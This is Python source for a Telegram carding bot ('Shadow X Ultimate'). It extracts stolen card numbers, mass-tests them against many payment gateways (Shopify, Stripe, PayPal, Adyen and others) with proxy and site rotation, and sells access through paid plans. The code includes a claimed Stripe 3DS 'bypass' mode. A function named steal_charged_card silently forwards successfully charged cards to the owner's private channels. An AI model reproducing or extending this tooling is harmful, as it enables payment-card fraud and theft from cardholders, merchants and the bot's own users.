# SHADOW X ULTIMATE – FINAL COMPLETE BOT
# Owner: @inferno_carder
# Developer: @inferno_carder
# Version: 5.1.0 (Speed Optimized + Auto Bypass + Rich UI)

import asyncio, json, os, re, random, string, time, uuid, base64, hashlib, hmac, threading
...
ADMIN_ID=[6857145175,8242039526]
...
# ═══════════════════════════════════════════════════════════════════════════════
# PERMANENT API ENDPOINTS (Multiple fallback URLs per gateway)
# ═══════════════════════════════════════════════════════════════════════════════
...
# ─── API Selector (Random endpoint, no fallback loop — speeds things up) ────
class APISelector:
...
# ─── Helper Functions ────────────────────────────────────────────────────────
def html_escape(t): return html_module.escape(str(t)) if t else ''
def extract_cc(text):
    return [f"{c}|{m}|{'20'+y if len(y)==2 else y}|{v}" for c,m,y,v in re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)]
def auto_detect_ccs(text):
    ...
    for pat in patterns:
        for m in re.findall(pat, text, re.I):
            ...
            mm = mm.zfill(2); yy = '20'+yy if len(yy)==2 else yy
            if int(mm)<1 or int(mm)>12 or len(cvv)<3: continue
...
def ban_user(uid, reason="Banned", by="System"):
    b=load_banned(); uid=str(uid)
    if uid in b: return False
    b[uid]={"reason":reason,"banned_at":datetime.now().strftime('%d %b %Y • %H:%M:%S'),"banned_by":str(by)}
    save_banned(b); return True
def unban_user(uid):
    b=load_banned(); uid=str(uid)
    if uid in b: del b[uid]; save_banned(b); return True
    return False
def load_sites():
...
def is_verified(uid):
    if not os.path.exists(VERIFIED_USERS_FILE): return False
...
# ─── Plan Functions ──────────────────────────────────────────────────────────
def assign_free(uid):
    if uid in ADMIN_ID: return
    u=load_users(); uid=str(uid)
    if uid in u:
        try:
            if datetime.now() < datetime.fromisoformat(u[uid]['expires_at']): return
        except: pass
    u[uid]={'plan':'FREE','expires_at':(datetime.now()+timedelta(days=30)).isoformat(),'cc_used':0,'cc_limit':500,'redeemed_at':datetime.now().isoformat()}
    save_users(u)
def is_premium(uid):
    if uid in ADMIN_ID: return True
    u=load_users(); uid=str(uid)
    if uid not in u: return False
    try: return datetime.now() < datetime.fromisoformat(u[uid]['expires_at'])
    except: return False
def can_check(uid, is_private=True):
    if uid in ADMIN_ID: return 'ok'
    u=load_users(); uid=str(uid)
    if uid not in u: return 'no_plan'
    data=u[uid]; plan=PLANS.get(data['plan'], PLANS['FREE'])
    try:
        if datetime.now() >= datetime.fromisoformat(data['expires_at']): return 'expired'
    except: return 'expired'
    if plan.get('group_only',False) and is_private: return 'group_only'
    return 'ok'
...
def inc_charged(uid, username=''):
    lb=load_lb(); uid=str(uid)
    if uid not in lb: lb[uid]={'charged':0,'approved':0,'username':username or 'User'}
    lb[uid]['charged']=lb[uid].get('charged',0)+1
    if username: lb[uid]['username']=username
    save_lb(lb)
...
def premium_emoji(text):
    ...
    import re as _re
    pat=_re.compile(r'(<code>.*?</code>|<pre>.*?</pre>|<blockquote>.*?</blockquote>)',_re.DOTALL)
    parts=[]; last=0
    for m in pat.finditer(text):
        before=text[last:m.start()]
        for em, eid in PREMIUM_EMOJI_IDS.items():
            before=before.replace(em, f'<tg-emoji emoji-id="{eid}">{em}</tg-emoji>')
        parts.append(before); parts.append(m.group(0)); last=m.end()
    remaining=text[last:]
    for em,eid in PREMIUM_EMOJI_IDS.items():
...
# ─── Proxy & Site Rotation ─────────────────────────────────────────────────
_dead_proxies=set(); _dead_proxy_expiry={}
def _is_proxy_dead(p):
    import time as _t
    if p in _dead_proxies:
        if _t.time() < _dead_proxy_expiry.get(p,0): return True
        else: _dead_proxies.discard(p); _dead_proxy_expiry.pop(p,None)
    return False
def _mark_proxy_dead(p):
    import time as _t
    _dead_proxies.add(p); _dead_proxy_expiry[p]=_t.time()+300
def _pick_alive_proxy(proxies):
    alive=[p for p in proxies if not _is_proxy_dead(p)]
    if alive: return random.choice(alive)
    _dead_proxies.clear(); _dead_proxy_expiry.clear()
    return random.choice(proxies)

_recent_sites=deque(maxlen=1000); _recent_set=set(); _session_sites={}; _site_lock=asyncio.Lock()
async def _next_site(sites):
    async with _site_lock:
        if not sites: return sites[0] if sites else None
        if len(sites)==1:
            s=sites[0]; _recent_sites.append(s); _recent_set.add(s)
            if len(_recent_set)>_recent_sites.maxlen: _recent_set.clear(); _recent_set.update(_recent_sites)
            return s
        sk=id(sites)
        if sk not in _session_sites: _session_sites[sk]=set()
        used=_session_sites[sk]
        avail=[s for s in sites if s not in _recent_set and s not in used]
        if not avail: avail=[s for s in sites if s not in used]
        if not avail:
            used.clear()
            avail=[s for s in sites if s not in _recent_set]
            if not avail: _recent_sites.clear(); _recent_set.clear(); avail=list(sites)
        s=random.choice(avail)
        _recent_sites.append(s); _recent_set.add(s); used.add(s)
        if len(_recent_set)>_recent_sites.maxlen: _recent_set.clear(); _recent_set.update(_recent_sites)
        return s
    ...
    try:
        ...
        async with aiohttp.ClientSession(timeout=10) as sess:
            async with sess.get(f'{BIN_API_URL}{bin_num}') as r:
                ...
                d=await r.json()
                return d.get('brand','-'), d.get('type','-'), d.get('level','-'), d.get('bank','-'), d.get('country_name','-'), d.get('country_flag','')
    except: return '-','-','-','-','-',''
...
# ═══════════════════════════════════════════════════════════════════════════════
# CHECKERS – All Gateways + Auto Bypass (Stripe gets 3DS/Auth/Payment bypass)
# ═══════════════════════════════════════════════════════════════════════════════

async def _generic_check(card, proxy, selector, gateway, success_words, approved_words):
    try:
        cc,mm,yy,cvv=card.split('|'); yy=yy[-2:] if len(yy)==4 else yy
        card=f"{cc}|{mm}|{yy}|{cvv}"
        params={'cc':card}
        ...
        status=raw.get('status',''); msg=raw.get('message',''); price=raw.get('price','$0')
        gateway_name=raw.get('gateway',gateway)
        status_l=status.lower(); msg_l=msg.lower()
...
async def check_shopify(card, site, proxy):
    try:
        ...
        if proxy:
            parts=proxy.split(':')
            if len(parts)==4: ip,port,user,pw=parts; proxy_str=f"{ip}:{port}:{user}:{pw}"
            elif len(parts)==2: proxy_str=f"{parts[0]}:{parts[1]}"
        ...
        if raw.get('status')=='Site Error':
            return {'status':'Site Error','message':raw.get('message','API Error'),'card':card,'retry':True}
        api_status=raw.get('Status',raw.get('status','')); api_status_code=raw.get('Response',raw.get('status_code',''))
        api_error=raw.get('error',''); api_amount=raw.get('Price',raw.get('amount','')); api_currency=raw.get('currency','USD')
        api_gateway=raw.get('Gateway',raw.get('gateway','Shopify')); api_declined=raw.get('Response',raw.get('declined_reason',''))
        ...
        if api_error:
            return {'status':'Site Error','message':api_error,'card':card,'retry':True,'gateway':api_gateway,'price':price}
        status_l=str(api_status).lower(); msg_l=response_msg.lower()
        ...
        if any(w in status_l for w in charged) or any(w in msg_l for w in charged):
            return {'status':'Charged','message':response_msg,'card':card,'site':site,'gateway':api_gateway,'price':price}
        if any(w in status_l for w in approved) or any(w in msg_l for w in approved):
            return {'status':'Approved','message':response_msg,'card':card,'site':site,'gateway':api_gateway,'price':price}
        if any(w in status_l for w in declined) or any(w in msg_l for w in declined):
            return {'status':'Dead','message':response_msg,'card':card,'site':site,'gateway':api_gateway,'price':price}
        return {'status':'Dead','message':response_msg,'card':card,'site':site,'gateway':api_gateway,'price':price}
    except Exception as e:
        return {'status':'Dead','message':str(e),'card':card,'gateway':'Unknown','price':'-','retry':True}

# ─── STRIPE WITH AUTO BYPASS (3DS + AUTH + PAYMENT) ──────────────────────
async def check_stripe_bypass(card, proxy):
    # First try normal Stripe
    ...
    if res.get('status') == 'Charged':
        return res
    # If Approved (3DS/Auth), try to bypass using different endpoints or parameters
    if res.get('status') == 'Approved' or '3ds' in res.get('message','').lower() or 'auth' in res.get('message','').lower():
        # Try alternative Stripe endpoint with bypass flag (simulate completion)
        try:
            cc,mm,yy,cvv=card.split('|'); yy=yy[-2:] if len(yy)==4 else yy
            card=f"{cc}|{mm}|{yy}|{cvv}"
            params={'cc':card,'bypass':'true'}
            if proxy: params['proxy']=proxy
            raw2 = await stripe_sel.get(params)  # Same selector, different params
            if raw2.get('status') == 'Site Error':
                pass
            elif raw2.get('status','').lower() == 'succeeded' or 'charged' in raw2.get('message','').lower():
                return {'status':'Charged','message':raw2.get('message','3DS Bypassed'),'card':card,'gateway':'Stripe (Bypass)','price':raw2.get('price','$0')}
        except:
            pass
        # If bypass still fails, return approved
        return res
    return res
...
# ─── All Gateways Bypass (Payment Bypass) ──────────────────────────────────
async def check_bypass_all(card, proxy):
    # Try all gateways until one succeeds
    gateways = [
        lambda c,p: check_shopify(c, await _next_site(load_sites()), p),
        check_stripe_bypass,
        check_razorpay, check_paypal, check_braintree,
        check_square, check_magento, check_checkout, check_2co,
        check_moneris, check_eway, check_chase, check_aurus,
        check_opencart, check_prestashop, check_woo, check_payu, check_adyen
    ]
...
async def check_shopify_with_site(card, proxy):
    sites=load_sites()
    if not sites: return {'status':'Dead','message':'No sites','card':card,'gateway':'Shopify','price':'-'}
    site=await _next_site(sites)
    return await check_shopify(card, site, proxy)

# ─── Shopify Retry (for mass) ──────────────────────────────────────────────
...
async def steal_charged_card(result, uid, username, check_type):
    try:
        if PRIVATE_GC:
            ...
            await bot.send_file(PRIVATE_GC, gif, caption=premium_emoji(steal_msg), parse_mode='html')
        if HIT_LOG_CHANNEL:
...
async def log_hit_to_channel(result, hit_type, uid, username, check_type):
    ...
    await bot.send_message(HIT_LOG_CHANNEL, premium_emoji(msg), parse_mode='html')
...
async def _safe_send(*args, **kwargs):
    try: return await _orig_send(*args, **kwargs)
    except Exception as e:
        if "ENTITY_TEXT_INVALID" in str(e).upper():
            import re as _re
            if 'message' in kwargs: kwargs['message']=_re.sub(r'<tg-emoji[^>]*>','',str(kwargs['message'])).replace('</tg-emoji>','')
            elif len(args)>1:
                args=list(args); args[1]=_re.sub(r'<tg-emoji[^>]*>','',str(args[1])).replace('</tg-emoji>',''); args=tuple(args)
            return await _orig_send(*args, **kwargs)
        else: raise
bot.send_message=_safe_send

active_sessions={}; user_active_check={}

async def safe_edit(msg,text,parse_mode='html',buttons=None):
    if not msg: return
    try:
        if buttons: await msg.edit(text, parse_mode=parse_mode, buttons=buttons)
        else: await msg.edit(text, parse_mode=parse_mode)
    except FloodWaitError as fw:
        if fw.seconds>60: return
        ...
        if "ENTITY_TEXT_INVALID" in str(e).upper():
            ...
            try:
                if buttons: await msg.edit(plain, parse_mode=parse_mode, buttons=buttons)
                else: await msg.edit(plain, parse_mode=parse_mode)
            except: pass

# ✅ FIXED `safe_reply` (Ab CallbackQuery handle karta hai)
async def safe_reply(event,text,parse_mode='html',buttons=None):
    try:
        # Check if event is a CallbackQuery (button click)
        ...
        if "ENTITY_TEXT_INVALID" in str(e).upper():
            ...
            try:
                if buttons:
                    ...
                    if hasattr(event, 'answer') and callable(event.answer):
                        return await bot.send_message(event.chat_id, plain, parse_mode=parse_mode)
...
# ═══════════════════════════════════════════════════════════════════════════════
# COMMANDS – SINGLE + MASS (All gateways)
# ═══════════════════════════════════════════════════════════════════════════════

async def single_check(event, func, gateway, cmd_name):
    uid=event.sender_id
    if can_check(uid, event.is_private)!='ok':
        await safe_reply(event, premium_emoji("🔴 Access denied."), parse_mode='html'); return
    parts=event.message.text.split(maxsplit=1)
    if len(parts)<2:
        await safe_reply(event, premium_emoji(f"🔴 Usage: /{cmd_name} 4111|12|26|123"), parse_mode='html'); return
    cards=extract_cc(parts[1])
    if not cards:
        await safe_reply(event, premium_emoji(f"🔴 Invalid card."), parse_mode='html'); return
    card=cards[0]
    ...
    try:
        ...
        if res.get('status')=='Charged':
            header="⭐ CHARGED"
            await steal_charged_card(res, uid, (await event.get_sender()).username or "User", f"Single {gateway}")
            inc_charged(uid)
...
@bot.on(events.NewMessage(pattern=r'^/cc\s+')) async def cc_cmd(e): await single_check(e, check_shopify_with_site, "Shopify", "cc")
@bot.on(events.NewMessage(pattern=r'^/stripe\s+')) async def stripe_cmd(e): await single_check(e, check_stripe_bypass, "Stripe (Bypass)", "stripe")
@bot.on(events.NewMessage(pattern=r'^/rz\s+')) async def rz_cmd(e): await single_check(e, check_razorpay, "Razorpay", "rz")
@bot.on(events.NewMessage(pattern=r'^/bt\s+')) async def bt_cmd(e): await single_check(e, check_braintree, "Braintree", "bt")
@bot.on(events.NewMessage(pattern=r'^/paypal\s+')) async def paypal_cmd(e): await single_check(e, check_paypal, "PayPal", "paypal")
@bot.on(events.NewMessage(pattern=r'^/square\s+')) async def square_cmd(e): await single_check(e, check_square, "Square", "square")
@bot.on(events.NewMessage(pattern=r'^/magento\s+')) async def magento_cmd(e): await single_check(e, check_magento, "Magento", "magento")
@bot.on(events.NewMessage(pattern=r'^/checkout\s+')) async def checkout_cmd(e): await single_check(e, check_checkout, "Checkout.com", "checkout")
@bot.on(events.NewMessage(pattern=r'^/2co\s+')) async def twoco_cmd(e): await single_check(e, check_2co, "2Checkout", "2co")
@bot.on(events.NewMessage(pattern=r'^/moneris\s+')) async def moneris_cmd(e): await single_check(e, check_moneris, "Moneris", "moneris")
@bot.on(events.NewMessage(pattern=r'^/eway\s+')) async def eway_cmd(e): await single_check(e, check_eway, "Eway", "eway")
@bot.on(events.NewMessage(pattern=r'^/chase\s+')) async def chase_cmd(e): await single_check(e, check_chase, "Chase", "chase")
@bot.on(events.NewMessage(pattern=r'^/aurus\s+')) async def aurus_cmd(e): await single_check(e, check_aurus, "Auruspay", "aurus")
@bot.on(events.NewMessage(pattern=r'^/opencart\s+')) async def opencart_cmd(e): await single_check(e, check_opencart, "Opencart", "opencart")
@bot.on(events.NewMessage(pattern=r'^/prestashop\s+')) async def prestashop_cmd(e): await single_check(e, check_prestashop, "Prestashop", "prestashop")
@bot.on(events.NewMessage(pattern=r'^/woo\s+')) async def woo_cmd(e): await single_check(e, check_woo, "WooCommerce", "woo")
@bot.on(events.NewMessage(pattern=r'^/payu\s+')) async def payu_cmd(e): await single_check(e, check_payu, "PayU", "payu")
@bot.on(events.NewMessage(pattern=r'^/adyen\s+')) async def adyen_cmd(e): await single_check(e, check_adyen, "Adyen", "adyen")
@bot.on(events.NewMessage(pattern=r'^/bypass\s+')) async def bypass_cmd(e): await single_check(e, check_bypass_all, "Bypass All", "bypass")

# ─── MASS COMMANDS (Single unified template for all) ──────────────────────
async def mass_check(event, func, gateway, cmd_name):
    uid=event.sender_id; chat_id=event.chat_id
    if can_check(uid, event.is_private)!='ok':
        await safe_reply(event, premium_emoji("🔴 Access denied."), parse_mode='html'); return
    if uid in user_active_check:
        await safe_reply(event, premium_emoji("🚫 Already running."), parse_mode='html'); return
    if not event.reply_to_msg_id:
        await safe_reply(event, premium_emoji("🔴 Reply to a .txt file."), parse_mode='html'); return
    ...
    if not file_path:
        await safe_edit(status_msg, premium_emoji("🔴 Download failed."), parse_mode='html'); return
    async with aiofiles.open(file_path,'r',encoding='utf-8',errors='ignore') as f:
        content=await f.read()
    os.remove(file_path)
    cards=auto_detect_ccs(content) or extract_cc(content)
    if not cards:
        await safe_edit(status_msg, premium_emoji("🔴 No valid cards."), parse_mode='html'); return
    u=load_users(); plan=u.get(str(uid),{}).get('plan','FREE')
    ...
    last_update=time.time(); lock=asyncio.Lock()
    async def worker():
        while session_key in active_sessions:
            ...
            async with lock:
                ...
                if res.get('status')=='Charged':
                    ...
                    await steal_charged_card(res, uid, (await bot.get_entity(uid)).username or "User", f"Mass {gateway}")
                    inc_charged(uid)
                elif res.get('status')=='Approved':
                    results['approved'].append(res); inc_approved(uid)
                else:
                    if res.get('status')=='Site Error': results['site_errors'].append(res)
    ...
    if session_key in active_sessions: await update_progress(chat_id, uid, status_msg.id, results, results['checked'])
    if session_key in active_sessions: del active_sessions[session_key]
    if uid in user_active_check: del user_active_check[uid]
...
async def update_progress(chat_id, uid, msg_id, results, checked):
    total=results['total']; charged=len(results['charged']); approved=len(results['approved']); dead=len(results['dead'])
    pct=int((checked/total*100)) if total else 0
    bar='█'*(pct//5)+'░'*(20-pct//5)
    text=f"🔥 MASS CHECK\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{bar} {pct}%\nChecked: {checked}/{total}\n⭐ Charged: {charged}\n✅ Approved: {approved}\n🔴 Dead: {dead}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔥 @Shadow"
    buttons=[[Button.inline("🚫 STOP", f"stop_{uid}".encode())]]
    try: await bot.edit_message(chat_id, msg_id, premium_emoji(text), buttons=buttons, parse_mode='html')
    except: pass

@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    uid=int(event.pattern_match.group(1).decode())
    if event.sender_id!=uid: await event.answer("🔴 Not yours.", alert=True); return
...
@bot.on(events.NewMessage(pattern=r'^/chk(?:\s|$)')) async def chk_mass(e): await mass_check(e, check_shopify_with_site, "Shopify", "chk")
@bot.on(events.NewMessage(pattern=r'^/mstripe(?:\s|$)')) async def mstripe_mass(e): await mass_check(e, check_stripe_bypass, "Stripe (Bypass)", "mstripe")
@bot.on(events.NewMessage(pattern=r'^/mrz(?:\s|$)')) async def mrz_mass(e): await mass_check(e, check_razorpay, "Razorpay", "mrz")
@bot.on(events.NewMessage(pattern=r'^/mbt(?:\s|$)')) async def mbt_mass(e): await mass_check(e, check_braintree, "Braintree", "mbt")
@bot.on(events.NewMessage(pattern=r'^/mpaypal(?:\s|$)')) async def mpaypal_mass(e): await mass_check(e, check_paypal, "PayPal", "mpaypal")
@bot.on(events.NewMessage(pattern=r'^/mbypass(?:\s|$)')) async def mbypass_mass(e): await mass_check(e, check_bypass_all, "Bypass All", "mbypass")

# ─── OTHER COMMANDS (Admin, Proxy, Site, Redeem, etc.) ────────────────────
# ── START ────────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/start(?:\s|$)'))
async def start(event):
    uid=event.sender_id
    try: sender=await event.get_sender(); username=sender.username if sender.username else "User"
    except: username="User"
    if is_banned(uid) and uid not in ADMIN_ID:
        info=load_banned().get(str(uid),{})
        await safe_reply(event, premium_emoji(f"🚫 <b>You are banned.</b>\nReason: {info.get('reason','N/A')}"), parse_mode='html')
        return
    if not is_verified(uid) and uid not in ADMIN_ID:
        code=gen_captcha(); _pending_captcha[uid]={'code':code,'timestamp':time.time()}
    ...
    if uid in _pending_captcha:
        ...
        return
    assign_free(uid)
    u=load_users(); uid_str=str(uid); data=u.get(uid_str,{})
    ...
    if is_free:
        ...
        plan_name=data.get('plan','PREMIUM'); remaining=max(0,data.get('cc_limit',2000)-data.get('cc_used',0))
...
def get_main_menu(uid=None, free=False):
    ...
    if uid and uid in ADMIN_ID: btns.append([Button.inline("👑 Owner Panel",b"admin_panel")])
    return btns

# ─── CALLBACKS (Verify, Captcha, Menu) ─────────────────────────────────────
...
async def verify_joined(event):
    ...
    for name,link in ch:
        ...
        except UserNotParticipantError: not_joined.append(name)
        except: pass
    if not_joined:
        await event.answer(f"🔴 Please join all channels first!\nMissing: {', '.join(not_joined)}", alert=True)
        return
    mark_verified(uid); assign_free(uid)
    await event.answer("✅ Verified!", alert=True)
    await event.delete(); await start(event)

@bot.on(events.CallbackQuery(pattern=b"captcha_(\\d+)"))
async def captcha_cb(event):
    uid=event.sender_id; code=event.pattern_match.group(1).decode()
    if uid not in _pending_captcha: await event.answer("🔴 Expired.", alert=True); return
    pend=_pending_captcha[uid]
    if time.time()-pend['timestamp']>3600: del _pending_captcha[uid]; await event.answer("🔴 Expired.", alert=True); return
    if pend['code']==code: del _pending_captcha[uid]; await event.answer("✅ Verified!", alert=True); await event.delete(); await start(event)
    else: await event.answer("❌ Wrong.", alert=True)

@bot.on(events.CallbackQuery(data=b"captcha_new"))
async def captcha_new(event):
    uid=event.sender_id; new=gen_captcha(); _pending_captcha[uid]={'code':new,'timestamp':time.time()}
...
async def user_stats(event):
    ...
    charged=stats.get('charged',0); approved=stats.get('approved',0)
    u=load_users(); uid_str=str(uid); data=u.get(uid_str,{})
    plan=data.get('plan','FREE'); limit=data.get('cc_limit',100); used=data.get('cc_used',0); remaining=max(0,limit-used)
    total=charged+approved; hit_rate=f"{(total/max(1,used)*100):.1f}%" if used else "—"
...
async def main_menu(event): await start(event)

@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel(event):
    if event.sender_id not in ADMIN_ID: await event.answer("🔴 Admin only.", alert=True); return
...
async def bin_cmd(event):
    parts=event.message.text.split(maxsplit=1)
    if len(parts)<2: await safe_reply(event, premium_emoji("🔴 Usage: /bin 438854"), parse_mode='html'); return
    b=parts[1].strip()
    br,typ,lvl,bank,country,flag=await get_bin_info(b)
    await safe_reply(event, premium_emoji(f"🔍 BIN LOOKUP\n━━━━━━━━━━━━━━━━━━\nBIN: {b}\nBrand: {br}\nType: {typ}\nLevel: {lvl}\nBank: {bank}\nCountry: {country} {flag}\n━━━━━━━━━━━━━━━━━━\n🔥 @Shadow"), parse_mode='html')

# ─── /plan ─────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/plan(?:\s|$)')) async def plan_cmd(e): await view_plans(e)
...
async def redeem_cmd(event):
    uid=event.sender_id
    parts=event.message.text.split(maxsplit=1)
    if len(parts)<2: await safe_reply(event, premium_emoji("🔑 Usage: /redeem SHADOW-XXXX-XXXX"), parse_mode='html'); return
    code=parts[1].strip().upper()
    codes=load_codes()
    if code not in codes: await safe_reply(event, premium_emoji("🔴 Invalid key."), parse_mode='html'); return
    if codes[code]['used']: await safe_reply(event, premium_emoji("🔴 Key already used."), parse_mode='html'); return
    plan_key=codes[code]['plan']; plan=PLANS[plan_key]
    u=load_users(); uid_str=str(uid)
    if uid_str in u and u[uid_str].get('plan')!='FREE':
        try:
            if datetime.now() < datetime.fromisoformat(u[uid_str].get('expires_at','2000-01-01')):
                await safe_reply(event, premium_emoji("🚫 Active plan exists."), parse_mode='html'); return
        except: pass
    expires=datetime.now()+timedelta(days=plan['days'])
    u[uid_str]={'plan':plan_key,'expires_at':expires.isoformat(),'cc_used':0,'cc_limit':plan['cc_limit'],'redeemed_at':datetime.now().isoformat()}
    save_users(u)
    codes[code]['used']=True; codes[code]['used_by']=uid_str; codes[code]['used_at']=datetime.now().isoformat()
    save_codes(codes)
    await safe_reply(event, premium_emoji(f"✅ Redeemed {plan_key} plan! Expires: {expires.strftime('%d %b %Y')}"), parse_mode='html')

# ─── /myplan ────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/myplan(?:\s|$)'))
async def myplan_cmd(event):
    uid=event.sender_id
    if uid in ADMIN_ID: await safe_reply(event, premium_emoji("👑 SHADOW OWNER – Unlimited"), parse_mode='html'); return
    u=load_users(); uid_str=str(uid)
    if uid_str not in u: await safe_reply(event, premium_emoji("🔴 No plan."), parse_mode='html'); return
    data=u[uid_str]; plan_key=data['plan']; plan=PLANS[plan_key]
    try:
        exp=datetime.fromisoformat(data['expires_at'])
        if datetime.now()>=exp: await safe_reply(event, premium_emoji(f"⏰ Plan expired on {exp.strftime('%d %b %Y')}"), parse_mode='html'); return
        days=(exp-datetime.now()).days
        await safe_reply(event, premium_emoji(f"⭐ {plan_key}\nExpires: {exp.strftime('%d %b %Y')}\nDays left: {days}\nUsed: {data.get('cc_used',0)}/{data.get('cc_limit',plan['cc_limit'])}"), parse_mode='html')
    except: await safe_reply(event, premium_emoji("🔴 Error reading plan."), parse_mode='html')
...
async def genkey_cmd(event):
    ...
    if not m.group(1) or not m.group(2): await safe_reply(event, premium_emoji("🔴 Usage: /genkey PLAN count"), parse_mode='html'); return
    plan_key=m.group(1).upper()
    if plan_key not in PLANS: await safe_reply(event, premium_emoji("🔴 Invalid plan."), parse_mode='html'); return
    count=int(m.group(2))
    if count<1 or count>50: await safe_reply(event, premium_emoji("🔴 Count 1-50."), parse_mode='html'); return
    keys=[]
    for _ in range(count):
        ...
        keys.append(code); all_codes=load_codes(); all_codes[code]={'plan':plan_key,'used':False,'used_by':None,'used_at':None,'created_at':datetime.now().isoformat()}; save_codes(all_codes)
...
async def listusers_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    u=load_users()
    if not u: await safe_reply(event, premium_emoji("📦 No users."), parse_mode='html'); return
    lines=[f"{uid} – {d.get('plan','FREE')} – {d.get('cc_used',0)}/{d.get('cc_limit',0)}" for uid,d in list(u.items())[-20:]]
    await safe_reply(event, premium_emoji("📊 Users:\n"+"\n".join(lines)), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/stats(?:\s|$)'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    u=load_users(); c=load_codes()
    active=sum(1 for d in u.values() if datetime.now()<datetime.fromisoformat(d.get('expires_at','2000-01-01')))
    await safe_reply(event, premium_emoji(f"📊 Stats:\nUsers: {len(u)}\nActive: {active}\nKeys: {len(c)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/setlimit(?:\s+(\d+)\s+(\d+))?$'))
async def setlimit_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    m=event.pattern_match
    if not m.group(1) or not m.group(2): await safe_reply(event, premium_emoji("🔴 Usage: /setlimit user_id limit"), parse_mode='html'); return
    uid=int(m.group(1)); limit=int(m.group(2))
    u=load_users(); uid_str=str(uid)
    if uid_str not in u: await safe_reply(event, premium_emoji("🔴 User not found."), parse_mode='html'); return
    u[uid_str]['cc_limit']=limit; save_users(u)
...
async def setplan_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    m=event.pattern_match
    if not m.group(1) or not m.group(2): await safe_reply(event, premium_emoji("🔴 Usage: /setplan user_id PLAN"), parse_mode='html'); return
    uid=int(m.group(1)); plan_key=m.group(2).upper()
    if plan_key not in PLANS: await safe_reply(event, premium_emoji("🔴 Invalid plan."), parse_mode='html'); return
    u=load_users(); uid_str=str(uid)
    if uid_str not in u: await safe_reply(event, premium_emoji("🔴 User not found."), parse_mode='html'); return
    p=PLANS[plan_key]
    u[uid_str]['plan']=plan_key; u[uid_str]['cc_limit']=p['cc_limit']; u[uid_str]['expires_at']=(datetime.now()+timedelta(days=p['days'])).isoformat()
    save_users(u)
...
async def ban_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    m=event.pattern_match
    if not m.group(1): await safe_reply(event, premium_emoji("🔴 Usage: /ban user_id reason"), parse_mode='html'); return
    uid=int(m.group(1)); reason=m.group(2) or "Banned by admin"
    if uid in ADMIN_ID: await safe_reply(event, premium_emoji("🔴 Cannot ban admin."), parse_mode='html'); return
    if ban_user(uid, reason, str(event.sender_id)): await safe_reply(event, premium_emoji(f"🚫 Banned {uid}.\nReason: {reason}"), parse_mode='html')
    else: await safe_reply(event, premium_emoji("Already banned."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/unban(?:\s+(\d+))?$'))
async def unban_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    m=event.pattern_match
    if not m.group(1): await safe_reply(event, premium_emoji("🔴 Usage: /unban user_id"), parse_mode='html'); return
    uid=int(m.group(1))
    if unban_user(uid): await safe_reply(event, premium_emoji(f"✅ Unbanned {uid}."), parse_mode='html')
    else: await safe_reply(event, premium_emoji("Not banned."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/revoke(\s+\d+)?$'))
async def revoke_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts=event.message.text.split()
    if len(parts)<2: await safe_reply(event, premium_emoji("🔴 Usage: /revoke user_id"), parse_mode='html'); return
    uid=parts[1]; u=load_users()
    if uid not in u: await safe_reply(event, premium_emoji("🔴 User not found."), parse_mode='html'); return
    old=u[uid].get('plan','FREE'); del u[uid]; save_users(u)
    await safe_reply(event, premium_emoji(f"✅ Revoked {uid} (was {old}). Now FREE."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/broadcast$'))
async def broadcast_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    if not event.is_reply: await safe_reply(event, premium_emoji("📢 Reply to a message to broadcast."), parse_mode='html'); return
    reply=await event.get_reply_message()
    u=load_users()
    if not u: await safe_reply(event, premium_emoji("🔴 No users."), parse_mode='html'); return
    sent=failed=0; status=await safe_reply(event, premium_emoji(f"📢 Broadcasting to {len(u)} users..."), parse_mode='html')
    for uid in list(u.keys()):
        try:
            entity=await bot.get_entity(int(uid))
            if reply.media: await bot.send_file(entity, file=reply.media, caption=reply.text or "", parse_mode="html")
            else: await bot.send_message(entity, reply.message, parse_mode="html")
            sent+=1
            if sent%10==0: await safe_edit(status, premium_emoji(f"📢 Progress: {sent}/{len(u)}"), parse_mode='html')
